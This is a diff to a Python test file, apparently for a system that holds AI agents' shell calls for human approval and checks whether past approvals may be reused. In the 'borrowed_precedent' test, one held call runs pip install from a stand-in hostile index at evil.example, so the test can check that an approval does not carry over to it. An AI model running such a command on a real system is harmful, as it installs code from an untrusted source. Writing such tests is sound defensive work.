@@ -207,7 +207,7 @@ ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
 ME, PERSON, REVIEWER_USER = CallerIdentity("uid", "501", True), CallerIdentity("uid", "502", True), \
     CallerIdentity("uid", "299", True)
 TWO = {"answers": [{"model": "m", "decision": "approve"}, {"model": "m", "decision": "approve"}]}
-INDEX = "pip install --isolated --index-url https://pypi.internal/simple {}"   # pinned: an AI may answer it
+INDEX = "PIP_CONFIG_FILE=/dev/null pip install --isolated --index-url https://pypi.internal/simple {}"   # pinned
 BATCH = 300   # held calls per signer: under AGENT_REVIEWS_PER_TENANT, so no cap answers in the reviewer's place
 REQUESTERS = [CallerIdentity("uid", str(10000 + i), True) for i in range(BATCH)]   # E18.H's, one per held call
 LAPTOP = None
@@ -338,7 +338,7 @@ def forged_precedent(w):
 def borrowed_precedent(w):
     w.precedent({"command": INDEX.format("a")})
     other = w.new_run(CallerIdentity("uid", "503", True))
-    held = {"another index": w.ask({"command": "pip install --isolated --index-url https://evil.example/simple a"}),
+    held = {"another index": w.ask({"command": INDEX.replace("pypi.internal", "evil.example").format("a")}),
             "another project": w.ask({"command": INDEX.format("a")}, project="/Users/dev/web"),
             "no project": w.ask({"command": INDEX.format("a")}, project=None),
             "another tool": w.ask({"command": INDEX.format("a")}, tool="run_tool"),
@@ -409,7 +409,7 @@ def siblings(rules, tool, args):
     target, and for TK-A062 and TK-SHELL-PARSE (a precedent is the call exactly) near-siblings of the call itself, the
     same but for its quoted literals, the folders of its paths, or one more argument (a working folder)."""
     if "TK-A025" in rules:
-        return [({"command": "pip install --isolated --index-url https://mirror.internal/simple requests"}, "Bash")]
+        return [({"command": INDEX.replace("pypi.internal", "mirror.internal").format("requests")}, "Bash")]
     near = [{k: re.sub(r"'[^'\n]*'", "'e18'", re.sub(r'"[^"\n]*"', '"e18"', v)) if isinstance(v, str) else v
              for k, v in args.items()},
             {k: re.sub(r"(?<![\w.~$])/(?:[\w.-]+/)+(?=[\w.-])", "/tmp/e18/", v) if isinstance(v, str) else v
